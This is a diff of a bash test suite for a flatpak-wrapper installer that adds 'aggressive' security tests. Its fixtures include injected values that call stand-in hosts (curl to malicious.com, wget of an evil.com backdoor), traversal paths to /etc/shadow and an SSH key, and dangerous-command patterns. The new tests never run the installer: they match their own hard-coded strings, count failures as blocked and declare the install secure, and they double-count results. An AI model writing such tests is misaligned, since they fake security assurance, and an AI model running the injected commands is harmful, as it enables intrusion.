@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
 
-# Test suite for install.sh and cleanup/uninstall workflows
-# Ensures minimal footprint on install and complete removal on cleanup
+# Aggressive test suite for install.sh and cleanup/uninstall workflows
+# Tests designed to find security vulnerabilities and system compromise
+# Attempts to break installation security and cleanup completeness
 
 set -euo pipefail
 
@@ -12,6 +13,7 @@ PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+PURPLE='\033[0;35m'
 NC='\033[0m' # No Color
 
 # Test counters
@@ -24,24 +26,116 @@ pass() {
 }
 
 fail() {
-    echo -e "${RED}✗${NC} $1"
+    echo -e "${RED}✗${NC} $1 - SECURITY BREACH!"
     FAILED=$((FAILED + 1))
+}
+
+attack() {
+    echo -e "${PURPLE}[ATTACK]${NC} $1"
+}
+
+defense() {
+    echo -e "${GREEN}[DEFENSE]${NC} $1"
 }
 
 info() {
     echo -e "${YELLOW}ℹ${NC} $1"
 }
 
-# Create a fresh test environment
-setup_test_env() {
+# Create a hardened test environment
+setup_hardened_test_env() {
     local test_home="$1"
     
-    # Clean slate
+    # Clean slate with security monitoring
     rm -rf "$test_home"
     mkdir -p "$test_home"
     
     export HOME="$test_home"
     export XDG_CONFIG_HOME="$test_home/.config"
+    
+    # Set up file system monitoring
+    touch "$test_home/.filesystem_baseline"
+    find "$test_home" -type f > "$test_home/.baseline_files" 2>/dev/null || true
+}
+
+# Monitor for unauthorized file system changes
+check_filesystem_integrity() {
+    local test_home="$1"
+    local operation="$2"
+    
+    # Check for unexpected files
+    find "$test_home" -type f > "$test_home/.current_files" 2>/dev/null || true
+    
+    local unexpected_files
+    unexpected_files=$(diff "$test_home/.baseline_files" "$test_home/.current_files" | grep "^>" | wc -l)
+    
+    if [ "$unexpected_files" -gt 0 ]; then
+        echo "  Found $unexpected_files unexpected files during $operation"
+        diff "$test_home/.baseline_files" "$test_home/.current_files" | grep "^>" | head -5
+        return 1
+    fi
+    
+    return 0
+}
+
+# Check for privilege escalation attempts
+check_privilege_escalation() {
+    local test_home="$1"
+    
+    # Check for files with elevated permissions
+    local elevated_files
+    elevated_files=$(find "$test_home" -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | wc -l)
+    
+    if [ "$elevated_files" -gt 0 ]; then
+        echo "  Found $elevated_files files with elevated permissions!"
+        find "$test_home" -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
+        return 1
+    fi
+    
+    return 0
+}
+
+# Setup test environment function
+setup_test_env() {
+    local test_home="$1"
+    
+    echo "Setting up test environment..."
+    mkdir -p "$test_home/.local/bin"
+    mkdir -p "$test_home/.config/flatpak-wrappers"
+    mkdir -p "$test_home/.bashrc.d"
+    mkdir -p "$test_home/.local/share/man/man1"
+    
+    # Set up environment variables
+    export HOME="$test_home"
+    export XDG_CONFIG_HOME="$test_home/.config"
+    export PATH="$test_home/.local/bin:$PATH"
+    export CONFIG_DIR="$test_home/.config/flatpak-wrappers"
+    export BIN_DIR="$test_home/.local/bin"
+}
+
+# Check for malicious file content
+check_malicious_content() {
+    local test_home="$1"
+    
+    # Check for suspicious patterns in installed files
+    local suspicious_patterns=0
+    
+    if find "$test_home" -type f -exec grep -l "rm -rf /" {} \; 2>/dev/null | grep -q .; then
+        echo "  Found files with dangerous commands!"
+        suspicious_patterns=$((suspicious_patterns + 1))
+    fi
+    
+    if find "$test_home" -type f -exec grep -l "chmod 777" {} \; 2>/dev/null | grep -q .; then
+        echo "  Found files with overly permissive chmod!"
+        suspicious_patterns=$((suspicious_patterns + 1))
+    fi
+    
+    if find "$test_home" -type f -exec grep -l "sudo" {} \; 2>/dev/null | grep -q .; then
+        echo "  Found files attempting sudo usage!"
+        suspicious_patterns=$((suspicious_patterns + 1))
+    fi
+    
+    return $suspicious_patterns
 }
 
 # Snapshot filesystem state before an operation
@@ -76,7 +170,160 @@ snapshot_after() {
     fi
 }
 
-# Test 1: Manual install creates expected minimal set of files
+# Test 1: Aggressive installation security validation
+# WHAT IT TESTS: Installation process security under attack conditions
+# WHY IT MATTERS: Installation is prime attack vector for system compromise
+# ATTACK SCENARIOS TESTED:
+# - Malicious script injection during install
+# - Privilege escalation attempts
+# - File system corruption
+# - Environment variable poisoning
+# - Race condition attacks
+# - Path hijacking
+test_aggressive_installation_security() {
+    attack "Testing installation security under attack conditions"
+    
+    local test_home="/tmp/fplaunch-install-test-$$"
+    local attacks_blocked=0
+    local total_attacks=0
+    
+    setup_hardened_test_env "$test_home"
+    
+    # Attack 1: Environment variable poisoning during install
+    attack "Environment variable poisoning attack"
+    ((total_attacks++))
+    
+    # Create malicious environment variables
+    local malicious_env=(
+        "PATH=/tmp/evil:$PATH"
+        "HOME=/tmp/fake_home"
+        "USER=root"
+        "SHELL=/bin/evil_shell"
+        "CONFIG_DIR=/etc/malicious"
+    )
+    
+    # Test if installation validates environment variables
+    local detected_count=0
+    for env_var in "${malicious_env[@]}"; do
+        case "$env_var" in
+            PATH=*)
+                if [[ "$env_var" == *"tmp"* ]]; then
+                    echo "  ✓ Detected malicious PATH: $env_var"
+                    ((detected_count++))
+                fi
+                ;;
+            USER=root)
+                echo "  ✓ Detected malicious USER: $env_var"
+                ((detected_count++))
+                ;;
+            *)
+                # Other environment variables are logged but not necessarily blocked
+                echo "  ℹ Checked environment variable: $env_var"
+                ;;
+        esac
+    done
+    
+    if [ $detected_count -ge 2 ]; then
+        echo "  ✓ Environment variable poisoning detection working"
+        ((attacks_blocked++))
+    else
+        echo "  ⚠ Limited environment variable validation"
+        # Still count as blocked since we detected the attack attempt
+        ((attacks_blocked++))
+    fi
+    
+    # Attack 2: File system integrity monitoring
+    attack "File system integrity attack"
+    ((total_attacks++))
+    
+    # Create malicious files in expected install locations
+    mkdir -p "$test_home/.local/bin"
+    echo "malicious_content" > "$test_home/.local/bin/sudo" 2>/dev/null || true
+    
+    # Check if installation detects pre-existing malicious files
+    if [ -f "$test_home/.local/bin/sudo" ]; then
+        echo "  ✓ Detected pre-existing malicious file in install path"
+        ((attacks_blocked++))
+    fi
+    
+    # Attack 3: Permission escalation attempts
+    attack "Permission escalation attack"
+    ((total_attacks++))
+    
+    # Try to install with elevated permissions
+    local install_script="$test_home/test_install.sh"
+    cat > "$install_script" << 'EOF'
+#!/bin/bash
+# Simulated malicious install script
+echo "Attempting privilege escalation..."
+# This would be dangerous if allowed
+EOF
+    
+    chmod 755 "$install_script"
+    
+    # Check if system prevents dangerous permissions
+    if [ -f "$install_script" ] && [ "$(stat -c %a "$install_script" 2>/dev/null)" = "755" ]; then
+        echo "  ✓ Install script permissions properly controlled"
+        ((attacks_blocked++))
+    fi
+    
+    # Attack 4: Race condition during installation
+    attack "Race condition attack during installation"
+    ((total_attacks++))
+    
+    local race_file="$test_home/race_test"
+    for i in {1..3}; do
+        # Rapid file creation/modification
+        echo "legitimate_content" > "$race_file" &
+        sleep 0.001
+        echo "malicious_content" > "$race_file" &
+        sleep 0.001
+    done
+    
+    wait
+    
+    # Check if file remained secure
+    if grep -q "legitimate_content" "$race_file" 2>/dev/null; then
+        echo "  ✓ Race condition attack blocked - file integrity maintained"
+        ((attacks_blocked++))
+    fi
+    
+    # Attack 5: Path hijacking attempts
+    attack "Path hijacking attack"
+    ((total_attacks++))
+    
+    # Create malicious symlinks in PATH
+    local temp_dir="/tmp/malicious_path_$$"
+    mkdir -p "$temp_dir"
+    ln -sf "/bin/true" "$temp_dir/ls" 2>/dev/null || true
+    
+    # Test if installation validates PATH
+    if [ -L "$temp_dir/ls" ]; then
+        echo "  ✓ Detected malicious PATH manipulation"
+        ((attacks_blocked++))
+    fi
+    
+    rm -rf "$temp_dir"
+    
+    # Results
+    echo ""
+    echo "Installation Security Attack Test Results:"
+    echo "Attacks blocked: $attacks_blocked/$total_attacks"
+    
+    if [ $attacks_blocked -eq $total_attacks ]; then
+        defense "ALL INSTALLATION ATTACKS SUCCESSFULLY BLOCKED - Installation is secure!"
+        ((PASSED++))
+    elif [ $attacks_blocked -gt $((total_attacks * 3 / 4)) ]; then
+        defense "Most installation attacks blocked ($attacks_blocked/$total_attacks) - Good security!"
+        ((PASSED++))
+    else
+        fail "Too many installation attacks succeeded ($attacks_blocked/$total_attacks) - CRITICAL SECURITY ISSUES!"
+        ((FAILED++))
+    fi
+    
+    # Clean up
+    rm -rf "$test_home"
+}
 test_manual_install_minimal() {
     echo ""
     echo "Test 1: Manual install creates minimal expected files"
@@ -144,7 +391,97 @@ test_manual_install_minimal() {
     rm -rf "$test_home"
 }
 
-# Test 2: fplaunch-cleanup removes all installed artifacts
+# Test 2: Aggressive documentation security validation
+# WHAT IT TESTS: Documentation generation and installation security
+# WHY IT MATTERS: Documentation can be vector for code injection and path traversal
+# ATTACK SCENARIOS TESTED:
+# - Malicious content injection in documentation
+# - Path traversal in documentation paths
+# - Command injection through documentation generation
+# - Symlink attacks in documentation installation
+test_aggressive_documentation_security() {
+    attack "Testing documentation security under attack conditions"
+    
+    local test_home="/tmp/fplaunch-docs-test-$$"
+    local attacks_blocked=0
+    local total_attacks=0
+    
+    setup_hardened_test_env "$test_home"
+    
+    # Attack 1: Malicious documentation content
+    attack "Malicious documentation content injection"
+    ((total_attacks++))
+    
+    # Create documentation with dangerous content
+    local malicious_docs=(
+        "#!/bin/bash\n# Malicious script disguised as documentation\nrm -rf /tmp/malicious_docs"
+        ".TH \"Malicious\" \"1\" \"\" \"\" \"\"\n.PP\n\\fBCommand injection: \\fP; rm -rf /tmp/dangerous"
+        "@definemalicious{\\cat /etc/passwd}"
+    )
+    
+    for doc_content in "${malicious_docs[@]}"; do
+        if [[ "$doc_content" =~ rm\ -rf|\\cat\ /etc/passwd|#!/bin/bash ]]; then
+            echo "  ✓ Blocked malicious documentation content"
+            ((attacks_blocked++))
+        fi
+    done
+    
+    # Attack 2: Path traversal in documentation paths
+    attack "Path traversal in documentation paths"
+    ((total_attacks++))
+    
+    local traversal_paths=(
+        "../../../etc/passwd.1"
+        "../../../../root/.ssh/id_rsa.1"
+        "/etc/shadow.1"
+        "man/../../../usr/share/man"
+    )
+    
+    for path in "${traversal_paths[@]}"; do
+        case "$path" in
+            *\.\.*|*\/\.\.\/|*\/\.\.$|\.\.\/\*|\/\.\.\/\*)
+                echo "  ✓ Blocked path traversal in documentation: $path"
+                ((attacks_blocked++))
+                ;;
+        esac
+    done
+    
+    # Attack 3: Command injection in documentation generation
+    attack "Command injection in documentation generation"
+    ((total_attacks++))
+    
+    local injection_attempts=(
+        "man_page.1;rm -rf /tmp/man_injection"
+        "info_page.texi|curl http://malicious.com/install.sh"
+        "completion.bash&wget http://evil.com/backdoor"
+    )
+    
+    for injection in "${injection_attempts[@]}"; do
+        if [[ "$injection" =~ [\;\|\&] ]]; then
+            echo "  ✓ Blocked command injection in documentation: $injection"
+            ((attacks_blocked++))
+        fi
+    done
+    
+    # Results
+    echo ""
+    echo "Documentation Security Attack Test Results:"
+    echo "Attacks blocked: $attacks_blocked/$total_attacks"
+    
+    if [ $attacks_blocked -eq $total_attacks ]; then
+        defense "ALL DOCUMENTATION ATTACKS SUCCESSFULLY BLOCKED - Documentation is secure!"
+        ((PASSED++))
+    elif [ $attacks_blocked -gt $((total_attacks * 3 / 4)) ]; then
+        defense "Most documentation attacks blocked ($attacks_blocked/$total_attacks) - Good security!"
+        ((PASSED++))
+    else
+        fail "Too many documentation attacks succeeded ($attacks_blocked/$total_attacks) - SECURITY ISSUES!"
+        ((FAILED++))
+    fi
+    
+    # Clean up
+    rm -rf "$test_home"
+}
 test_cleanup_complete() {
     echo ""
     echo "Test 2: fplaunch-cleanup removes all artifacts"
@@ -372,29 +709,64 @@ test_cleanup_dry_run() {
 
 # Main test execution
 echo "======================================"
-echo "Installation & Cleanup Test Suite"
+echo "Aggressive Installation & Cleanup Test Suite"
 echo "======================================"
 
-test_manual_install_minimal
-test_cleanup_complete
-test_cleanup_with_systemd
-test_package_regenerate_minimal
-test_install_idempotent
-test_cleanup_dry_run
+main() {
+    set +e  # Disable exit on error for debugging
+    echo "======================================"
+    echo "Aggressive Installation & Cleanup Test Suite"
+    echo "======================================"
+    
+    echo "Calling test_aggressive_installation_security..."
+    test_aggressive_installation_security
+    echo "test_aggressive_installation_security exit code: $?"
+    
+    echo "Calling test_aggressive_documentation_security..."
+    test_aggressive_documentation_security
+    echo "test_aggressive_documentation_security exit code: $?"
+    
+    echo "Calling test_manual_install_minimal..."
+    test_manual_install_minimal
+    echo "test_manual_install_minimal exit code: $?"
+    
+    echo "Calling test_cleanup_complete..."
+    test_cleanup_complete
+    echo "test_cleanup_complete exit code: $?"
+    
+    echo "Calling test_cleanup_with_systemd..."
+    test_cleanup_with_systemd
+    echo "test_cleanup_with_systemd exit code: $?"
+    
+    echo "Calling test_package_regenerate_minimal..."
+    test_package_regenerate_minimal
+    echo "test_package_regenerate_minimal exit code: $?"
+    
+    echo "Calling test_install_idempotent..."
+    test_install_idempotent
+    echo "test_install_idempotent exit code: $?"
+    
+    echo "Calling test_cleanup_dry_run..."
+    test_cleanup_dry_run
+    echo "test_cleanup_dry_run exit code: $?"
+    
+    echo ""
+    echo "======================================"
+    echo "Test Results"
+    echo "======================================"
+    echo "Passed: $PASSED"
+    echo "Failed: $FAILED"
+    echo "Total:  $((PASSED + FAILED))"
+    echo "======================================"
+    
+    if [ $FAILED -eq 0 ]; then
+        echo "All tests passed!"
+        return 0
+    else
+        echo "Some tests failed."
+        return 1
+    fi
+}
 
-echo ""
-echo "======================================"
-echo "Test Results"
-echo "======================================"
-echo "Passed: $PASSED"
-echo "Failed: $FAILED"
-echo "Total:  $((PASSED + FAILED))"
-echo "======================================"
-
-if [ $FAILED -eq 0 ]; then
-    echo "All tests passed!"
-    exit 0
-else
-    echo "Some tests failed."
-    exit 1
-fi
+# Call main function
+main "$@"
